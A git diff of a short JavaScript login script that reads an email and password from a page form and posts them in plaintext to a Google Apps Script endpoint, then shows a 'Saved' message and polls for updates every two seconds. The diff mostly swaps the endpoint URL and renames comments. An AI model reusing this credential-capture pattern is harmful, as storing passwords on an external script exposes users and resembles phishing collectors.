@@ -1,7 +1,6 @@
-const API_URL = "https://script.google.com/macros/s/AKfycbzNbgmhyjWxB88xfq0RLfrprlUZVICEGZwxTOFiQvX60mlW9oZRwmfU_wO6pH2LOBN6/exec";
+const API_URL = "https://script.google.com/macros/s/AKfycbz1IR_8B0IACajd6hvcwMa9u-cTl2Yz1O5-tmErhu0BuOHcmOJ1NFVJvs0cX9g32zwX/exec";
 
-
-// 🔹 LOGIN FUNCTION
+// 🔹 LOGIN + SEND DATA
 async function login() {
   const email = document.getElementById("email").value.trim();
   const password = document.getElementById("password").value.trim();
@@ -20,21 +19,19 @@ async function login() {
       body: JSON.stringify({ email, password })
     });
 
-    // ⚠️ safer response handling
-    const text = await res.text();
-    const data = JSON.parse(text);
+    const data = await res.json();
 
     document.getElementById("msg").innerText =
-      data.message || "Saved successfully ✔";
+      data.message || "Saved ✔";
 
   } catch (err) {
-    console.error("Login error:", err);
+    console.error("Send error:", err);
     alert("Error sending data");
   }
 }
 
 
-// 🔹 LOAD MESSAGE (REAL-TIME)
+// 🔹 REAL-TIME MESSAGE LOAD
 async function loadMessage() {
   try {
     const res = await fetch(API_URL);
@@ -43,13 +40,13 @@ async function loadMessage() {
     document.getElementById("msg").innerText = data.message;
 
   } catch (err) {
-    console.log("Message load error");
+    console.log("Load error");
   }
 }
 
 
-// 🔹 START AUTO UPDATE
+// 🔹 AUTO UPDATE (REAL-TIME FEEL)
 window.onload = () => {
   loadMessage();
-  setInterval(loadMessage, 2000); // ⚡ 2 sec real-time update
+  setInterval(loadMessage, 2000); // 2 seconds safe realtime
 };
